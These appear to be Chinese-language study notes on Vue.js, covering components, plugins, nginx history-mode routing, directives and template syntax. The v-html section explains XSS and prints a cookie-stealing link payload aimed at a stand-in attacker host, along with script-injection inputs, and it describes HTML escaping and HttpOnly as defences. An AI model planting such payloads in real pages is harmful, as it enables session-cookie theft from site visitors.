# 待学的知识点: 
### **数据化大屏组件库**
http://datav.jiaminghi.com/

<br>

### **Vue3: 函数调用创建组件**

**2 -> 3:**  
h、createVNode、render

这里是模仿 element ui 的 $message 方法 也相当于是通过调用 message方法 来创建组件 有点类似下面的 将 Vue组件挂载到全局上的方法

**Element UI的 Message消息提示组件:**  
当我们点击 Show message 按钮 会触发 open回调, 回调中回调ElMessage() 方法 该方法会创建一个提示组件
```js
const open = () => {
  ElMessage("this is a message")
}
```

<br>

### 步骤:
**步骤1: 创建消息提示组件**
```html
<template>

<div class="wrapper">
  {{content}}
</div>

</template>
export default {
  props: {
    content: {
      type: String
    },
    duration: {
      type: Number
    },
    destroyFn: {
      type: Function
    }
  },
  mounted() {
    // 组件渲染完毕后 设置定时器
    setTimeout(() => {
      // 这里要销毁组件
      if(this.destroyFn) this.destroyFn()
    }, this.duration)
  }
}
</script>

<style scoped>
.wrapper {
  min-width: 300px;
  padding: 15px 30px;
  background-color: #edf6e6;
  color: #81cb4c;
  position: fixed;
  top: 30px;
  left: 50%;
  transform: translateX(-50%);
  border-radius: 10px;
}
</style>
``` 

<br>

**步骤2: App组件:**  
点击按钮 通过函数调用的方式 挂载(创建)消息组件, 通过 message() 来创建消息组件
```html
<template>
  <div>
    <h3>Vue2 函数调用创建组件</h3>
    <br>
    <button @click="show">按钮</button>
  </div>
</template>

<script>
// 引入 message 方法
import {message} from "./components/Message.js"

export default {
  name: "App",
  methods: {
    show() {
      // 调用message() 来创建消息提示组件
      message("我是Sam")
    }
  },
  
}
</script>
```

<br>

**步骤3: 定义 message() 方法:**  
1. 通过 h 函数 来创建 Message组件的VNode
```js
h(组件对象, {props})

// props用于向组件传递 props
```

2. 通过 render 根据VNode创建真实DOM
```js
// 参数2: 挂载点
render(vnode, document.body)
```

```js
// 在该js文件中导出 message()
import {h, render} from "vue"
import MessageComponent from "./Message.vue"

// content: 调用 message 传递过来的提示文字, duration持续时间
export const message = (content, duration = 3000) => {
  
  // 定义销毁组件的方法
  const destroyFn = () => {
    // 销毁组件也是用render方法
    render(null, document.body)
  }

  // 通过 h 函数得到 VNode
  // 向组件传入 content 数据
  let vnode = h(MessageComponent, {
    content,
    duration
  })

  // 通过 render() 拿到真实的DOM
  render(vnode, document.body)
}
```

<br>

### **将Vue组件挂载到全局上** 
参考资料: 
```s
https://blog.csdn.net/weixin_40352044/article/details/124794956
http://t.zoukankan.com/hmycheryl-p-11255929.html
https://vue3.chengpeiquan.com/plugin.html#%E6%9C%AC%E5%9C%B0%E6%8F%92%E4%BB%B6-new
```

<br>

### **要点:**
1. 我们在插件js文件中引入 组件
2. 通过 Vue.extend(组件) 的方式 得到 VC
3. 实例化Vc得到 组件
4. 将组件放到body上

<br>

### **步骤:**
**1. 定义插件:**
```js
// 引入 对话框组件 它是一个组件对象
import Modal from "../components/Modal.vue"

// 暴露一个对象
export default {

  // install
  install(Vue) {

    // 我们将 Modal 变成构造函数
    let VC = Vue.extend(Modal)

    // 实例化组件
    let modalVM = new VC ({
      el: document.createElement("div")
    })

    // 将组件的DOM结构挂载到 body 上
    document.body.appendChild(modalVM.$el)

    // 将对话框组件挂载到全局
    Vue.prototype.$modal = modalVM
  }
}
```

<br>

**2. 入口文件中注册插件**
```js
import Vue from 'vue'
import App from './App.vue'
import store from "./store"

import VueRouter from 'vue-router'
import router from "./router"

import modalPlugins from "./plugins/modal"
Vue.use(modalPlugins)

Vue.use(VueRouter)
Vue.config.productionTip = false

new Vue({
  store,
  router,
  render: h => h(App),
}).$mount('#app')
```

<br>

**3. 定义全局组件, 并提供操作组件的方法**
```html
<template>
  <div class="modal" v-show="isShow" :class="isShow ? 'open' : ''">
    <div class="dialog">
      <div>
        <span>你确定要退出当前页面么?</span>
      </div>
      <div>
        <button>取消</button> <button>确认</button>
      </div>
    </div>
  </div>
</template>

<script>

export default {
  name: "Modal",
  data() {
    return {
      isShow: false,
      custom: "open"
    }
  },
  methods: {
    show() {
      this.isShow = true
    },
    hide() {
      this.isShow = false
    }
  }
}
</script>
```

<br>

**4. 其他组件通过 this.$xxx 来找到全局组件操作组件**
```html
<template>
  <div>
    <h3>我是主页</h3>
    <br>
    <button @click="handler">logout</button>
  </div>
</template>

<script>
export default {
  name: "App",
  components: { Modal },
  methods: {
    handler() {
      this.$modal.isShow = true
    }
  },
}
</script>
```

<br>

### **addRoutes的使用**
https://www.cnblogs.com/zhuhuoxingguang/p/11759001.html
https://www.jianshu.com/p/27e304884459

https://router.vuejs.org/zh/api/#addroute-1

<br>

### **v-bind 的知识点**
https://juejin.cn/post/6844904101298323470

<br>

### **长列表优化**
https://www.cnblogs.com/mfyngu/p/13675004.html

<br>

### **全选**
https://segmentfault.com/a/1190000016313367

<br>

### **Vue 转 word**
https://blog.csdn.net/m0_47408822/article/details/121099257  

```
npm install html-docx-js --save
npm install file-saver --save

"file-saver": "^2.0.5",
"html-docx-js": "^0.3.1",
```

<br>

如果想让 打印的区域有样式 有如下的两种方式:
- vue里面 写内联样式
- html字符串里面定义style标签

```html
<template>
  <div id="app" ref="app">
    <span>我是页面的内容</span>
  </div>
</template>

<script>
import {saveAs} from "file-saver"
import Doc from "html-docx-js/dist/html-docx"

export default {
  name: 'App',

  // 在 mounted 里面操作
  mounted() {
    let content = this.$refs.app.innerHTML
    let html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        
        <style>
          table {
            background: red;
          }
        </style>
        
      </head>
      <body>
        ${content}
      </body>
      </html>
    `
    saveAs(
      Doc.asBlob(html, { orientation: 'landscape' }),
      '问卷调查.doc'
    );
  },
}
</script>
```

<br>

# Vue项目 使用 history 模式 部署到 nginx 上面 会产生
Nginx-Vue-History-404问题

我们的vue项目在打包后会生成 dist 文件夹 通常我们会将 dist 文件夹中的内容拖动到 nginx之类的服务器目录下 比如 nginx下的html目录中
```
| - nginx
  | - html
```

然后我们启动 nginx 来访问我们的项目 我们发现切换到其它的页面后刷新就会报404的错误

<br>

### **问题的原因:**  
我们的服务器是根据页面路由 去按路径寻找资源 我们打包好的web站点只有一个html页面 不存在其他资源 服务器找不到对应的页面才报404

比如 我们访问 localhost:3000/about 

找不到 about.html 所以会报404 的错误

<br>

### **解决方案:**
修改 nginx 配置, 然后 reload 配置文件
重新定回 index.html 就可以了

我们在 location 配置项里面 添加下面的属性配置项

```sql
location / {
  root html;
  index index.html index.htm;

  try_files $uri $uri/ /index.html;
}
```

``$uri``: 就是不当前的请求url 但是不包含?参数 然后后面会接上 /index.html

比如: 我们uri是 /about 那拼接后的结果就是 /about/index.html

如果给出的file都没有匹配到，则重新请求最后一个参数给定的uri，就是新的location匹配

<br>

**常见的变量:**  
- ``$uri`` 当前请求的 URI，但不含“？”后的参数

- ``$args`` 当前请求的参数，即“？”后的宇符串

- ``$arg_xxx`` 当前请求里的某个参数，“arg ”后是参数的名字

- ``$http_xxx`` 当前请求里的 xxx 头部对应的值

- ``$sent_http_xxx`` 返回给客户端的响应头部对应的值

- ``$remote_addr`` 客户端IP 地址。

- ``$http_cookie`` 获取cookie值

- ``$cookie_xxx`` 当前请求的cookie xxx对应的值

- ``$request_uri`` 浏览器发起的不作任何修改的请求的url中的path 如在www.baidu.com/p1/file?d=111, 其值为/p1/file?d=111

- ``$uri`` 指当前的请求URI，不包括任何参数，反映任何内部重定向或index模块所做的修改

- ``$request_method`` 请求方法



<br>

### **hash 配合 ``<component is>``**
https://tech.unifa-e.com/entry/2019/05/29/095443

**思路:**  
- 引入所需的组件
- ``:is="subPage"`` component组件上使用 计算属性
- 在计算属性中获取到 url 上的hash 利用 switch case 决定返回哪个组件

```html
<template>
  <div>
    <transition :name="fade" mode="out-in">
      <!-- 
        susPageの値に応じてコンポーネントを切り替えて、擬似的にページ遷移を表現
      -->
      <component :is="subPage"></component>
    </transition>
  </div>
</template>

<script>
import Input1SubPage from './subPages/Input1.vue'
import Input2SubPage from './subPages/Input2.vue'
import ConfirmSubPage from './subPages/Confirm.vue'
import CompleteSubPage from './subPages/Complete.vue'

export default {
  computed: {
    subPage () {
      // URLのhashの値に基づいて、返すコンポーネントを切り替え
      switch (this.$route.hash) {
        case '#input2':
          return Input2SubPage
        case '#confirm':
          return ConfirmSubPage
        case '#complete':
          return CompleteSubPage
        default:
          return Input1SubPage
      }
    }
  }
}
</script>
```

```html
<template>
  <div>
    <h1>入力画面1</h1>

    <!-- vue-routerを使ってURLのhashを変更 -->
    <router-link :to="{ hash: '#input2' }">次へ</router-link>
  </div>
</template>
```

<br>

# vue2中怎么使用 composition API

### **1. 安装**
```
npm install @vue/composition-api
```

### **2. 注册**
```js
// main.js中
import Vue from 'vue'
import VueCompositionAPI from '@vue/composition-api'

Vue.use(VueCompositionAPI)
```

### **3. 使用**
```
import { ref, reactive } from '@vue/composition-api'
```

<br>

### **$attrs**
$attrs在vc实例身上  

$attrs 有点像捡漏的 props声明接收的部分 它捡不到 没声明接收的部分就在它那  
$attrs是一个对象

但是还有一个知识点前面我们没有了解过 就是子组件中我们不利用props配置项来声明接收父组件传递过来的参数 这个数据也会在vc身上  

我们可以通过 this 看到 在 $attrs 身上

这种方式也可以使用父组件通过props传递过来的数据 但是这种方式没有办法对传递过来的数据进行类型限制  

如果我们在子组件使用props配置项声明接收后 我们就可以在模板中直接使用了 但是如果我们不接收的话 在模板中使用的时候 就要 $attrs.name 这种方式使用  

如果我们在子组件中声明接收了 那么数据就会挂载在vc身上 $attrs 中就会没有 如果没有声明接收 那么数据就会在 $attrs 中  

当我们父组件使用props传递数据后 如果我们没有在子组件里面声明接收 数据就会在 $attrs对象里面

<br>

### **问题:**
但是如果我们没有使用props声明接收 那么我们传递的数据 会被认为是 **attribute** 会被当作字符串内联到html文档里

```html
<Component test="test">
```

```html
<!-- 如果我们没有声明接收props的 那么数据就会作为标签属性 显示在标签中 -->
<div test="test">
```

为了避免上述的事情发生 我们要在**子组件**中 设置  
```js
inheritAttrs: false
```

<br>

# **扩展: attribute 和 property 的区别 **
### **property:**
是DOM中的属性 是JavaScript里的对象  
Property是这个DOM元素作为对象 其附加的内容 例如childNodes、firstChild等。

<br>

### **attribute:**
是HTML标签上的特性 它的值只能够是字符串

Attribute就是dom节点自带的属性:  
例如html中常用的id、class、title、align等。

<br>

### **$slots**
这个属性也在vc身上  

插槽的概念:   
简单的说下 就是子组件中我们可以定义插槽 然后调用该组件的父组件 可以在子组件中的标签体部分 填入内容

如果 子组件中 没有定义插槽 那么 父组件中填入的内容就会在 vc身上的 $slots 属性中

在$slots中的数据是Vnode 一旦我们在子组件中使用``<slot>``标签挖了坑后  
那么 $slots 中的虚拟节点就会变成真实的DOM节点

$slots: 我们可以在子组件中的 $slots 属性中 取出父组件传递过来的插槽内容

<br><br>

# Vue
vue分为插件和核心库, 核心库比较小, 在这做项目的时候再根据需求下载对应的插件
作用: 动态构建用户界面

<br>

### **Vue 是一个渐进式的框架, 什么是渐进式?**
你把数据给我 我给你呈现界面  
就是假如我们的应用很简单那么我们只需要 引入一个小巧的核心库就可以了 如果我们的应用比较复杂 可以引入各式各样的vue插件 比如 
- Core(vue 核心)
- vue-router(路由)
- vuex(状态管理)

可以满足你各种各样的需求

<br>

### **vue 有很多特点和 web 开发中常见的高级功能**
- 采用组件化模式 提高代码复用率 且让代码更好维护  
  ```
  在vue里面一个 .vue 文件就是一个组件 组件内部包括 html css js
  ```

- 声明式编码 让编码人员无需直接操作DOM 提高开发效率 区别于命令式编码

- 使用虚拟DOM + 优秀的Diff算法 尽量服用DOM节点
  ```
  虚拟DOM就是内存中的数据
  ```

- 前端路由技术
- 状态管理
- 虚拟 DOM

<br>

### **vue-cli: vue 脚手架**
帮助我们下载基于vue的项目的 项目写好了配置声明依赖等

<br>

### **案例 : Hello Vuejs**
我们来做我们的第一个 Vue 程序, 体验一下 Vue 的响应式

<br>

### **优点:**
数据和界面可以完全分离  
当数据发生改变的时候, 页面中的数据会自动发生响应(自动修改为新数据)

<br>

### **首先创建 Vue 的实例对象, 并传递了一个配置对象作为参数**
```
let app = new Vue({ 配置对象 })
```

<br>

### **配置对象中的配置项**
```js
let app = new Vue({
  el:'id'          // element: 选择器 -- vue管理的区域
  data: { }        // 数据
})
```

**<font color="#C2185B">el 属性:</font>**   
该属性决定了 Vue 对象挂载到哪一个元素上

<br>

**<font color="#C2185B">data 属性:</font>**   
该属性中通常定义一些数据(可能是自己定义, 可能是来源于服务器加载)

<br>

### **将 data 配置项中的数据显示在 html 结构中**

    {{变量名}}
    {{message}}

就是一个特殊的语法 它会对这个语法进行一个解析 它就会找message这个变量在data中有没有定义 如果data中有定义 就会把对应的变量的值在div中做一个显示

<br>

### **示例1:**
```html
<div id="app">
  {{message}}
</div>
```

实例化Vue的实例 const app = new Vue(), 在创建Vue实例的时候, 我们往里面传递了一个一个配置对象{ }

```js
const app = new Vue({
  el:'#app', 
  data: {
    message:'Sam要更加的努力和加油哦'
  }
})
```

<br>

### **示例2: v-model**
双向数据绑定
```html 
<div id="app">
  <input type="text" v-model='username'>
  <h3>hello, {{username}}</h3>
</div>

<script>
  // 创建vue实例
  const app = new Vue({
    el: '#app',
    data: {
      username: 'atguigu'
    }
  })
</script>
```

<br>

### **示例3: v-for**
数据列表, 我们现在从服务器请求过来一个列表, 希望展示到 HTML 中

HTML模板中, 使用 v-for 指令 这种模式是响应式的  
比如我们要往数据里面追加元素的时候, vue 会自己创建新的 li 来更新页面

```html
<div id="app">
  <ul>
    <!-- 
      在这里我们使用v-for来遍历我们传递进来的列表 
      Vue会自动帮我们创建4个li, 每个li中的元素是不一样的
     -->
    <li v-for='item in movies'>{{item}}</li>
  </ul>
</div>
<script>
const app = new Vue({
  el:'#app',
  data: {
    movies:['海王', '星际穿越', '大话西游', '少年派', '盗梦空间']
  }
})
</script>
```

<br>

### **示例4: 计数器**

点击 + 计数器+1  
点击 - 计数器-1

<br>

**<font color="#C2185B">methods配置项:</font>**   
该配置项用于在 vue 对象中定义方法

<br>

**<font color="#C2185B">@click指令:</font>**   
该指令用于监听某个元素的点击事件, 并且需要指定当发生点击时, 执行的方法(通常是 methods 中定义的方法)
```
@click 是 v-on的语法糖
```

```html
<div id="app">
  <h3>
    <span>当前计数:{{counter}}</span>
  </h3>
    <button v-on:click='sub'>-</button>
    <button v-on:click='add'>+</button>
</div>

<script>
const app = new Vue({
  el:'#app',
  data:{
    counter:0,
  },
  methods: {
    add:function() {
      // counter++; 在这里找不到counter 它会去全局里面找
      this.counter++;
    },

    sub:function() {
      this.counter--;
    }
  }
})
</script>

```

<br>

# Vue.js 安装

### **直接 CDN 的引入**
```
开发环境版本 包含了有帮助的命令行警告
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>

生产环境版本 优化了尺寸和速度
<script src="https://cdn.jsdelivr.net/npm/vue"></script>
```

<br>

### **下载和引入**
```
开发环境
https://vuejs.org/js/vue.js

生产环境
https://vuejs.org/js/vue.min.js
```

<br>

### **npm 安装**
学习到中间项目的时候会用到这种方式下载, 后续通过 webpack 和 cli 的使用

<br><br>

# VueJs DevTools
安装完后 控制台上会出现一个vue面板 里面的一个root代表了一个vue对象

<br><br>

# Vue 中 MVVM
什么是 MVVM 呢?  **Model-View-ViewModel**
```
v       对应的是html模板
model   对应data中的数据
vm      Vue实例对象
```

MVVM 就是将其中的 View 的状态和行为抽象化 让我们将视图 UI 和业务逻辑分开。  
当有数据需要展示的时候, viewmodel 会自动把数据绑定到 view 上面  
当 view 有事件触发的时候, 我们也是通过 ViewModel 

<br>

### **Vue 中的 MVVM**

                  ViewModel

    View        DOM Listeners       Model
                Data Bindings

    DOM             Vue             Plain JS OBJ


### **view 层**
视图层  
在我们前端开发中, 通常就是 DOM 层, 主要的作用是给用户展示各种信息

是html中的被vue管理的部分, 比如div id='app'

<br>

### **Model 层**
数据层  
数据可能是我们固定的死的数据, 但更多的是来自我们服务器, 从网络上请求下来的数据
我们计数器的案例中, 就是后面抽取出来的 obj, 当然 里面的数据结构可能没有这么简单

是数据对象(data) 数据是给视图用, 自动能读

<br>

### **vueModel 层**
纽带, 视图模型层  
视图模型层是 view 和 model 沟通的桥梁  
一方面它实现了 data binding 也就是数据绑定, 将 model 的改变实时的反应到 view 中  
另一方面它实现了 DOM listener 的监听, 当 dom 发生了一些事件(点击 滚动 touch 等)时, 可以监听到, 并在需要的情况下改变对应的 data

是视图模型 vue new出来的实例 
- 数据绑定  实现的效果 视图能够从data里面读数据
- DOM监听

<br><br>

# Vue的使用 引入JS版
跟jQ的使用方式一样 通过script标签引入Vue文件 引入后全局会多了一个Vue全局对象
我们在引入 Vue.js 的时候如果是开发版本 控制台会输出警告 如果不希望有警告的话我们可以使用 Vue.config 来进行配置

<br>

### **Vue.config**
它是一个对象 包含Vue的全局配置 可以在启动之前修改下列的property
一次修改全局都用

**属性:**   
productionTip: 默认值 true  

```js
// 设置为 false 以阻止vue在启动时生成生产提示
Vue.config.productionTip = false
```

<br><br>

# 创建 Vue 实例
容器和Vue实例是一对一的关系
```html
<!-- root容器里的代码被称为 Vue 模板 -->
<div id='root'>
  <h3>hello, {{title}}</h3>
</div>

<script>
Vue.config.productionTip = false

new Vue({
  el:'#root',
  data: {
    title: 'sam'
  }
})
</script>
```

### **配置项: el**
通过该配置项指定Vue管理的实例 值通常为css选择器字符串
```js 
  new Vue({
    el:'#root',

    // 也可以使用js代码来获取
    el: document.querySelector('#root')
  })
```

<br>

**<font color="#C2185B">配置项: data</font>**   
data中用于存储数据 数据供el所指定的容器去使用  
类型: object | function

作用:   
Vue实例对应的数据对象  
data中的一组组kv最终都会在vue实例上 也就是在this上 展开组件直接能看到data中的数据

**注意:**  
在组件当中 data 必须是一个函数  
只有配置在data中的数据 才会做数据代理 和 数据劫持  
data中的数据发生变化 模板就会重新解析 用到data中的数据的地方就会被重新执行

一旦data中的数据发生改变 界面里的用到该数据的地方也会发生改变

<br>

**<font color="#C2185B">配置项: methods</font>**   
配置在这里面的方法要么是回调 要么放在生命周期里面调用

**传参:**  
html模板中在调用方法的时候可以将数据通过实参的形式传递给 methods 中的方法

**类型:**  

    {[key]:function}

**作用:**   
定义属于 Vue 的一些方法, 可以在其他地方调用, 也可以在指令中使用

<br>

**<font color="#C2185B">配置项: template</font>**   
我们都是在 div#root里面写模板 其实这个区域可以不写任何东西
```html
<div id="root">
  <h3>放大10倍后的值是: <span v-big='number'></span></h3>
  <input type="text" v-fbind:value='number'>
</div>


<div id="root"> </div>
```

我们可以传入 template配置项 在里面写 模板的部分 vue在解析的时候会解析template中传入的模板 template的值是一个字符串

**注意:**  
1. 我们要使用模板字符串的形式
2. 多个结构的时候外层要套一个div
3. 使用template配置项的时候 vue在解析模板 挂载模板的时候 div#root会被template中内容完全替换 挂载到页面上的

```js 
new Vue({
  el: '#root',
  template: `
    <div>
      <h3>放大10倍后的值是: <span v-big='number'></span></h3>
      <input type="text" v-fbind:value='number'>
    </div>
  `
```


**<font color="#C2185B">配置项: watch</font>**  
**<font color="#C2185B">配置项: computed</font>**  
**<font color="#C2185B">配置项: filters</font>**  
**<font color="#C2185B">配置项: directives</font>**  

**<font color="#C2185B">配置项: components</font>**  
用于注册局部组件 类型是对象
```js 
components: {
  // 这才是给组件起名字 创建组件时的变量名用于找到我们定义的组件
  组件的名字:  引用组件的变量
}
```

<br><br>

# 配置项: el 和 data 另一种使用方式

### **el配置项  -- $mount**
我们使用Vue原型对象上的方法 $mount 来挂载容器
```js 
let vm = new Vue({
  data: {
    name: 'sam'
  }
})
vm.$mount('#root')

// 或者
new Vue({}).$mount('#root')
```

<br>

### **data对象 -- 函数**
上面我们一直使用的data对象式写法 它也可以写成函数式 函数内部必须return 一个对象  
数据在return的对象中进行定义

```js 
// 第一种
data: {}

// 第二种
data() {
  return {
    name: 'sam'
  }
}
```

data() {} 函数是Vue帮我们调用的 该函数的this是Vue实例对象 一般在对象中写函数都会写成es6简写方式

**注意:**  
这里不能使用 箭头函数的方式 this的指向会变成window  
由Vue管理的函数一定不要写箭头函数 一旦写了箭头函数 this就不再是Vue实例而是window

<br><br>

# 模板语法
插值的相关操作都是把变量放入文本中显示   
所有写表达式的地方 vm 身上的所有东西都可以看到拿来直接调用

模板中的{{ }}中可以直接使用vm身上的属性和方法不用加this 同时模板中出现的属性和方法也只会去vm中查找 按着原型链

```js 
{{alert}}   // 就会报错vm身上没有alert方法

// 解决办法
data: {
  window: window
}
{{winodw.alert}}


<li>{{console.log(count)}}</li>   // 报错

// 解决办法
data() {
  return { window: window }
}

<li>{{winodw.console.log(count)}}</li>
```

<br>

**<font color="#C2185B">插值语法 {{ js表达式 }}</font>**  
在 Mustache 语法中 不仅仅可以直接写变量, 也可以写简单的表达式
往往用于处理标签体内容

```html
<h2>{{message}}</h2>
<h2>{{message}}, 我是文本</h2>
<h2>{{firstName + lastName}}</h2>       // kobebryant
<h2>{{firstName +' '+ lastName}}</h2>   // kobe bryant
<h2>{{firstName}} {{lastName}}</h2>

// 直接显示
<h2>{{counter}}</h2>

// 显示counter的2倍
<h2>{{counter*2}}</h2>

data: {
  message:'你好啊',
  firstName:'kobe',
  lastName: 'bryant',
  counter:100
}
```

<br><br>

# 指令语法
往往用于解析标签属性(包括 标签属性 标签体内容 绑定事件)  
指令语法一般定义在标签的属性里面

<br>

### **<font color="#C2185B">v-once:</font>**  
该指令后面不需要跟任何表达式  
该指令表示元素和组件只会渲染一次, 不会随着数据的改变而改变(不会因为改变 data 里面的数据, 响应到 dom 中)

**应用场景:**  
在某些情况下, 我们可能不希望界面随意的跟随改变, 这个时候我们就可以使用这个指令

v-once所在节点在初次动态渲染后 就视为静态内容了 以后数据的改变不会引起v-once所在结构的更新 可以用于优化性能
```js
<h2 v-once>{{message}}</h2>
// 后续修改message里面的值 页面中显示的还是第一次的值
```

<br>

### **<font color="#C2185B">v-html:</font>**  
渲染文本到标签体中 如果文本中含有标签的时候 v-html 会对标签进行解析
该指令后面往往会跟上一个 string 类型, 会将 string 的 html 解析出来并且进行渲染
```js
<h2 v-html='message'></h2>    // 结果: 标题类型的hello

data: {
  message:'<h1>hello</h1>',
}
```

<br>

### **扩展: xss攻击**
v-html有安全性的问题 在网站上动态渲染任意html是非常危险的 容易导致xss攻击  
**一定要在可信的内容上使用v-html 永远不要用在用户提交的内容上**

先铺垫两个知识点:  

**<font color="#C2185B">document.cookie: </font>**  
可以拿到当前网站上所有的cookie

**<font color="#C2185B"><a href=javascript:location.href="坏人准备干坏事的网站"> </font>**  
a标签内容还可以这么写代码

<br>

### **什么是xss攻击?**
我们在登录一个网站的时候 如果成功登录后 目标服务器会返回给客户端cookie存储在用户的浏览器里面

每一个网站发送过来的cookie都是以网站为单位存储的 该cookie就相当于用户在目标网站的身份证 有了cookie甚至可以免登录

假如我们弄丢了cookie 被别人拿到 那么这个人就可以导入我们的cookie伪装成我们免密登录目标网站

<br>

### **作案场景:**
比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里

假如 有坏人 以下面的方式 留言
```html
<a href=javascript:location.href="http://www.huairen.com?document.cookie">有妞</a>
```

该段代码意思是 带着当前正在浏览上的所有cookie访问坏人的服务器并将cookie传递给坏人的服务器

假如我们程序员 整好 使用v-html来根据留言数据 渲染页面就会造成 这段代码被解析成一个标签 如果有人点击后 后果不堪设想

<br>

### **XSS的类型:**
- 反射型:

      一般需要攻击者事先制作好攻击链接 然后诱骗用户自己点击链接才会触发xss代码
      服务器中并没有这样的页面和内容 一般都存在于搜索页面中 特点是非持久性

- 存储型:

      代码是存储在服务器数据库中的 如在个人信息或发表评论的地方 如果对于用户输入的内容没有过滤或过滤不严格 那么这些代码将存储到服务器中每当有用户访问该页面的时候都会触发代码执行 这种xss非常的费县 容易造成蠕虫 大量盗窃cookie 

      虽然还有DOM型XSS 但是也还是包括在存储型里面 特点是持久性

<br>

### **XSS示例1:**

反射型:
```html
<input type="text" :v-model="msg"> 搜索

<h3>{{msg}}</h3>
```

我们在输入框内 填写如下代码 格式为:

    </h3> <script>alert(1)</script> <h3>

相当于我们往代码里面又插入了一段代码

<br>

### **解决方案**
当然cookie也有验证 需要在后端设置 给敏感数据 比如cookie设置 HttpOnly 这样只有浏览器才能读取cookie并携带cookie其它人都不可以

document.cookie也不能读取cookie 为空

<br>

前端人员除了传统的 XSS、CSRF 等安全问题之外 又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。

<br>

### **请判断以下两个说法是否正确:**
- XSS 防范是后端 RD(研发人员)的责任 后端 RD <font color="#C2185B">应该在所有用户提交数据的接口 对敏感字符进行转义</font> 才能进行下一步操作。

- 所有要插入到页面上的数据 都要通过一个敏感字符过滤函数的转义 过滤掉通用的敏感字符后 就可以插入到页面中。

<br>

### **XSS示例2:**
公司需要一个搜索页面 根据 URL 参数决定关键词的内容。

```html
<input type="text" value="<%= getParameter("keyword") %>">
<button>搜索</button>
<div>
  您搜索的关键词是: <%= getParameter("keyword") %>
</div>
```

然而 在上线后不久 小明就接到了安全组发来的一个神秘链接:   
```
http://xxx/search?keyword="><script>alert('XSS');</script>
```

小明带着一种不祥的预感点开了这个链接 [请勿模仿 确认安全的链接才能点开]。果然 页面中弹出了写着”XSS”的对话框。

当浏览器请求 ``http://xxx/search?keyword="><script>alert('XSS');</script>`` 时 

服务端会解析出请求参数 keyword 得到``><script>alert('XSS');</script>`` 拼接到 HTML 中返回给浏览器。形成了如下的 HTML: 

```html
<input type="text" value=""><script>alert('XSS');</script>">
<button>搜索</button>
<div>
  您搜索的关键词是: "><script>alert('XSS');</script>
</div>
```

浏览器无法分辨出 <script>alert('XSS');</script> 是恶意代码 因而将其执行。

这里不仅仅 div 的内容被注入了 而且 input 的 value 属性也被注入 alert 会弹出两次。

其实 这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。 聪明的小明很快找到解决方法 把这个漏洞修复: 

```html
<input type="text" value="<%= escapeHTML(getParameter("keyword")) %>">
<button>搜索</button>
<div>
  您搜索的关键词是: <%= escapeHTML(getParameter("keyword")) %>
</div>
```
 
escapeHTML() 按照如下规则进行转义: 
```
|字符|转义后的字符| |-|-| |&|&amp;| |<|&lt;| |>|&gt;| |"|&quot;| |'|&#x27;| |/|&#x2F;|
```

https://tech.meituan.com/2018/09/27/fe-security.html

<br><br>

### **<font color="#C2185B">v-text:</font>**
标签属性: 向其所在的标签插入文本  
如果 v-text 对应的值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
```js 
<h2 v-text='message'></h2>    // 结果:  <div>hello</div>

data: {
  message:'<div>hello</div>',
}
```

v-text 作用和 Mustache 比较相似, 都是用于将数据显示在界面中  
v-text 通常情况下, 接收一个 string 类型  
但是该方法不够灵活 它会拿到message的值覆盖掉标签中原有的文本
```js
<h2>{{message}}</h2>
<h2 v-text='message'></h2>      // 结果一样

data: {
  message:'你好啊',
}


// 不够灵活
<h2>{{message}}, sam</h2>           
// 你好啊, sam

<h2 v-text='message'>, sam</h2>     
// 只有你好啊 会覆盖掉 (, sam)
```

<br>

### **<font color="#C2185B">v-pre:</font>**
v-pre 用于跳过这个元素和它子元素的编译过程 可以利用它跳过 没有使用插值语法的节点 会加快编译

一般我们都会给 没有vue语法的节点加v-pre 这样vue就不用分析该节点了 跳过了编译过程
``<pre></pre>``的效果相似 在该标签里面的内容会原封不动的给你展示出来
```js
<h2>{{message}}</h2>            // 你好啊
<h2 v-pre>{{message}}</h2>      // {{message}}

data: {
  message:'你好啊',
}
```

<br>

### **<font color="#C2185B">v-cloak:</font>**
**应用场景:**  
当网速过慢的时候 不让未经解析的模板跑到页面上去 该方法需要 v-cloak 配合 css 来使用

**使用方式:**  
在目标标签里面 使用 v-cloak v-cloak 会在vue接管的一瞬间被删掉  
配置css样式 
```js 
[v-cloak] {
  display:none;
}
```

<br>

**应用场景:**  
js阻塞 js基础的时候我们就了解过js阻塞的概念
```
  js    这里我要是加载一个js文件 要花费 5s 的时间
  html  这里就会等待5s后才会渲染出结果
```

上面的这种情况下页面就会出现短暂的空白时间


那假如是下面的情况
```js 
  html   {{name}}
  // js     这里我要是加载一个js文件 要花费 5s 的时间
  // vue    这里就会等待5s后 vue才能功能 接管上面的html部分
```

上面的这种情况 页面会 展示 {{name}} 近5秒的时间 为了解决这个问题 我们可以在标签内部加上v-cloak这个属性

```js 
// CSS部分:
[v-cloak] {
  display:none;
}


// HTML部分:
<div id="app">
  <h2 v-cloak>{{message}}</h2>
</div>


// JS部分:
const app = new Vue({
  el:'#app',
  data: {
    message:'你好啊',
  }
})
```

<br>

### **<font color="#C2185B">自定义指令: directives配置项:</font>**
上面介绍的都是vue帮我们写好的指令我们都是直接拿过来使用的 也就是内置指令  
内置指令的背后也是在用操作dom的方式 也就是说 自定义指令是对原生操作dom的方式进行的封装

### **要点:**
- 自定义属性是通过 el 操作dom节点的一系列操作
- 自定义属性也是响应式的 绑定的数据发生变化 页面也会跟着发生变化

<br>

### **需求:**
定义一个 v-big指令   效果和v-text类似 但可以把绑定的数值放大10倍
定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点

<br>

### **directives 配置项**
- 标签属性中写 自定义指令 v-big
- 在 vm 配置对象中的 directives 配置项中写 自定义属性 big, big的配置有两种书写方式 对象 和 函数 

对象的优势在于可以处理细节上的东西
```js
  directives: { big: { } },   // 对象式
  directives: { big() { } }   // 函数式
```

*所谓的自定义指令就是一个函数 由vue帮我们调用*

```js
<h3>放大10倍后的值是: <span v-big='number'></span></h3>

data() {
  return {
    number: 50
  } 
},

directives: {
  big: {
    k: v
    k: v
    k: v
  }


  // 或者

  big(element binding) { }
}
```

